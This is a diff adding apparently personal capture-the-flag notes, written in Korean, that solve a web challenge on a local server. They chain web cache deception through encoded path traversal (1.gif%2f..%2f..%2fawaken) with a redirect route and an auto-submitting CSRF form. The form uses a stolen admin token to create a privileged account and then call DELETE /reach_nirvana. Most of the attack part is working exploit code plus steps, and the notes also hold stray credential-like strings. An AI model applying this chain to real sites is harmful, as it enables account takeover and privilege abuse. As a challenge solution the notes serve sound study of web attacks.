@@ -1,0 +1,46 @@
+metatron
+lordshiva42
+
+xx
+b4ed5dc532ca0663dbfd
+
+xxxxxxxxx
+6a886f36f4b995ca0330
+
+
+서버에 리다이렉트 구현
+app.get('/redir', (req,res) => {
+  res.redirect('http://127.0.0.1:3000/public/1.gif%2f..%2f..%2fawaken');
+})
+
+
+서버에 POST요청보낼거 구현
+<button id="submit">Submit</button><Br>
+    <form action="http://127.0.0.1:3000/public/2.gif%2f..%2f..%2fawaken" method="POST" id="zz">
+      <input name="role" value="guide">
+      <input name="username" value="aaafff">
+      <input name="_csrf" value="3a84495474510daedff44128c6724420.1757760057.3ceeeb95371c6af111552bd5cbc190ef90c3d5f71139fb84bad330c68778ec8f">
+    </form>
+    <script>
+document.getElementById('zz').submit();
+</script>
+
+
+/transcend에
+http://d.xs.st/redir 아까 리디렉션주소 보내놓고 (어드민 csrf토큰 따기위함)
+
+리디렉션되어서 캐시되었을테니
+/public/1.gif%2f..%2f..%2fawaken
+들어가서 csrf토큰 가져오기
+
+잽싸게 서버에 세팅해놨던 post바디에 csrf수정
+
+/transcend에서 서버에 세팅해둔 post폼으로 이동시키기
+
+자바스크립트 실행되면서 자동으로 post되면서 계정이 만들어짐, 
+동시에 action이 캐시가능한 action으로 되어있었으므로 
+이도 4번과 같이 접속해서 생성된 계정 정보 가져오기
+
+로그인
+
+DELETE /reach_nirvana
